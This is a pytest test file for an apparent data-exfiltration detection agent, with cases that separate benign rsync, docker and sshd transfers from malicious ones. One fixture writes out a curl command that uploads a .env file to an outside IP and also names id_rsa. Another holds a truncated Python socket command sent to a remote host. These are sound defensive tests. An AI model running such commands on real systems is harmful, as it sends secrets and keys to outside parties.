"""
test_content_inspection.py
==========================
Unit and Integration Tests for Content & Context Inspection Agent.
Validates accurate differentiation between genuine user high-volume transfers
and malicious data exfiltration.
"""

import pytest
from agents.content_inspection.agent import ContentInspectionAgent
from agents.content_inspection.config import (
    VERDICT_BENIGN_ROUTINE,
    VERDICT_EXFILTRATION_CRITICAL,
    VERDICT_GENUINE_USER_HIGH_VOLUME,
    VERDICT_SUSPICIOUS_UNVERIFIED,
)


@pytest.fixture
def agent():
    return ContentInspectionAgent()


def test_genuine_user_backup_rsync(agent):
    """
    Simulates a legitimate user performing an rsync backup of photos/videos.
    Transfers 150MB of data. Should NOT be flagged as an attack!
    """
    res = agent.inspect_transfer(
        event_id="evt-rsync-001",
        files=["family_vacation.mp4", "backup_2026.tar.gz"],
        process_name="rsync",
        command_line="rsync -avz /home/ubuntu/photos/ backup-server:/data/photos",
        user="ubuntu",
        destination="192.168.1.50",
        volume_bytes=150 * 1024 * 1024,
        preceding_compromise=False,
    )
    assert res["verdict"] == VERDICT_GENUINE_USER_HIGH_VOLUME
    assert res["is_attack"] is False
    assert res["is_high_volume"] is True
    assert "rsync" in res["process_evaluation"]["details"]
    assert res["confidence"] >= 0.85


def test_genuine_user_docker_pull_trusted_dest(agent):
    """
    Simulates high volume transfer from a verified trusted repository (Docker / GitHub).
    Should be recognized as genuine high volume.
    """
    res = agent.inspect_transfer(
        event_id="evt-docker-002",
        files=["layer.tar.gz"],
        process_name="docker",
        destination="registry-1.docker.io",
        volume_bytes=250 * 1024 * 1024,
        preceding_compromise=False,
    )
    assert res["verdict"] == VERDICT_GENUINE_USER_HIGH_VOLUME
    assert res["is_attack"] is False
    assert res["destination_evaluation"]["status"] == "TRUSTED"


def test_malicious_exfiltration_sensitive_env_file(agent):
    """
    Simulates exfiltration of .env and id_rsa using curl.
    Should be definitively flagged as EXFILTRATION_CRITICAL attack.
    """
    res = agent.inspect_transfer(
        event_id="evt-exfil-003",
        files=[".env", "id_rsa"],
        process_name="curl",
        command_line="curl -F file=@.env http://45.33.32.156/drop",
        user="www-data",
        destination="45.33.32.156",
        volume_bytes=12000,
        preceding_compromise=True,
    )
    assert res["verdict"] == VERDICT_EXFILTRATION_CRITICAL
    assert res["is_attack"] is True
    assert ".env" in res["sensitive_matches"]
    assert "id_rsa" in res["sensitive_matches"]
    assert res["confidence"] >= 0.90


def test_malicious_exfiltration_post_compromise(agent):
    """
    High-volume transfer from an unverified utility right after a host compromise.
    Should be flagged as EXFILTRATION_CRITICAL.
    """
    res = agent.inspect_transfer(
        event_id="evt-postcomp-004",
        files=["data.bin"],
        process_name="python3",
        command_line="python3 -c import socket...",
        destination="198.51.100.77",
        volume_bytes=20 * 1024 * 1024,
        preceding_compromise=True,
    )
    assert res["verdict"] == VERDICT_EXFILTRATION_CRITICAL
    assert res["is_attack"] is True


def test_routine_benign_low_volume(agent):
    """
    Routine small flow without any sensitive files or anomalies.
    Should be BENIGN_ROUTINE.
    """
    res = agent.inspect_transfer(
        event_id="evt-routine-005",
        files=[],
        process_name="sshd",
        destination="10.0.0.5",
        volume_bytes=4096,
        preceding_compromise=False,
    )
    assert res["verdict"] == VERDICT_BENIGN_ROUTINE
    assert res["is_attack"] is False
